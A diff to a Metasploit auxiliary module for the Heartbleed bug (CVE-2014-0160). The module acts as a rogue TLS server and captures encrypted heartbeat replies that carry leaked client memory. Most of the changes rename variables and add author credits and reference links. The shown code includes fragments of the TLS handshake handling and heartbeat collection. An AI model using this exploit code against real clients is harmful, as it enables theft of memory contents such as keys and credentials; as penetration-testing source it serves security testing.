@@ -18,14 +18,27 @@ class Metasploit3 < Msf::Auxiliary
         leak memory from client systems as they connect. This module is
         hardcoded for TLS/1.1 using the AES-128-CBC-SHA1 cipher.
       },
-      'Author'         => 'hdm',
+      'Author'         =>
+        [
+          'Neel Mehta', # Vulnerability discovery
+          'Riku', # Vulnerability discovery
+          'Antti', # Vulnerability discovery
+          'Matti', # Vulnerability discovery
+          'hdm' # MSF module
+        ],
       'License'        => MSF_LICENSE,
       'Actions'        => [['Capture']],
       'PassiveActions' => [['Capture']],
       'DefaultAction'  => 'Capture',
       'References'     =>
         [
-          ['CVE', '2014-0160']
+          ['CVE', '2014-0160'],
+          ['US-CERT-VU', '720951'],
+          ['URL', 'https://www.us-cert.gov/ncas/alerts/TA14-098A'],
+          ['URL', 'http://heartbleed.com/'],
+          ['URL', 'https://github.com/FiloSottile/Heartbleed'],
+          ['URL', 'https://gist.github.com/takeshixx/10107280'],
+          ['URL', 'http://filippo.io/Heartbleed/']
         ],
       'DisclosureDate' => 'Apr 07 2014'
     )
@@ -47,8 +60,8 @@ class Metasploit3 < Msf::Auxiliary
 
   # Setup the server module and start handling requests
   def run
-    @myhost = datastore['SRVHOST']
-    @myport = datastore['SRVPORT']
+    #@myhost = datastore['SRVHOST']
+    #@myport = datastore['SRVPORT']
     print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
     exploit
   end
@@ -98,11 +111,11 @@ class Metasploit3 < Msf::Auxiliary
     loop do
       break unless @state[c][:buff]
 
-      mtyp, mver, mlen = @state[c][:buff].unpack("Cnn")
-      break unless mlen
-      break unless @state[c][:buff].length >= mlen+5
+      message_type, message_ver, message_len = @state[c][:buff].unpack("Cnn")
+      break unless message_len
+      break unless @state[c][:buff].length >= message_len+5
 
-      mesg = @state[c][:buff].slice!(0, mlen+5)
+      mesg = @state[c][:buff].slice!(0, message_len+5)
 
       if @state[c][:encrypted]
         process_openssl_encrypted_request(c, mesg)
@@ -114,36 +127,33 @@ class Metasploit3 < Msf::Auxiliary
 
   # Process cleartext TLS messages
   def process_openssl_cleartext_request(c, data)
-    mtyp, mver = data.unpack("Cn")
+    message_type, message_version = data.unpack("Cn")
 
-    mcode = 0
-
-
-    if mtyp == 0x15 and data.length >= 7
-      mlevel, mreason = data[5,2].unpack("CC")
-      print_status("#{@state[c][:name]} Alert Level #{mlevel} Reason #{mreason}")
-      if mlevel == 2 and mreason == 0x30
+    if message_type == 0x15 and data.length >= 7
+      message_level, message_reason = data[5,2].unpack("CC")
+      print_status("#{@state[c][:name]} Alert Level #{message_level} Reason #{message_reason}")
+      if message_level == 2 and message_reason == 0x30
         print_status("#{@state[c][:name]} Client rejected our certificate due to unknown CA")
         return
       end
 
       if level == 2
-        print_status("#{@state[c][:name]} Client rejected our connection with a fatal error: #{mreason}")
+        print_status("#{@state[c][:name]} Client rejected our connection with a fatal error: #{message_reason}")
         return
       end
 
     end
 
-    unless mtyp == 0x18
-      mcode = data[5,1].to_s.unpack("C").first
-      print_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", mtyp, mver, mcode)}")
+    unless message_type == 0x18
+      message_code = data[5,1].to_s.unpack("C").first
+      print_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", message_type, message_version, message_code)}")
     end
 
     # Process the Client Hello
     unless @state[c][:received_hello]
 
-      unless (mtyp == 0x16 and data.length > 43 and mcode == 0x01)
-        print_status("#{@state[c][:name]} Expected a Client Hello, received #{sprintf("type %.2x code %.2x", mtyp, mcode)}")
+      unless (message_type == 0x16 and data.length > 43 and message_code == 0x01)
+        print_status("#{@state[c][:name]} Expected a Client Hello, received #{sprintf("type %.2x code %.2x", message_type, message_code)}")
         return
       end
 
@@ -166,7 +176,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Process the Client Key Exchange
-    if mtyp == 0x16 and data.length > 11 and mcode == 0x10
+    if message_type == 0x16 and data.length > 11 and message_code == 0x10
       print_status("#{@state[c][:name]} Processing Client Key Exchange...")
       premaster_length = data[9, 2].unpack("n").first
 
@@ -181,7 +191,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Process the Change Cipher Spec and switch to encrypted communications
-    if mtyp == 0x14 and mcode == 0x01
+    if message_type == 0x14 and message_code == 0x01
       print_status("#{@state[c][:name]} Processing Change Cipher Spec...")
       initialize_encryption_keys(c)
       return
@@ -191,8 +201,7 @@ class Metasploit3 < Msf::Auxiliary
 
   # Process encrypted TLS messages
   def process_openssl_encrypted_request(c, data)
-    mtyp, mver = data.unpack("Cn")
-    mcode      = 0
+    message_type, message_version = data.unpack("Cn")
 
     return if @state[c][:shutdown]
     return unless data.length > 5
@@ -204,10 +213,10 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    mcode = buff[0,1].to_s.unpack("C").first
-    print_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", mtyp, mver, mcode)}")
+    message_code = buff[0,1].to_s.unpack("C").first
+    print_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", message_type, message_version, message_code)}")
 
-    if mtyp == 0x16
+    if message_type == 0x16
       print_status("#{@state[c][:name]} Processing Client Finished...")
     end
 
@@ -217,7 +226,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Process heartbeat replies
-    if mtyp == 0x18
+    if message_type == 0x18
       print_status("#{@state[c][:name]} Encrypted heartbeat received (#{buff.length} bytes) [#{@state[c][:heartbeats].length} total]")
       @state[c][:heartbeats] << buff
     end
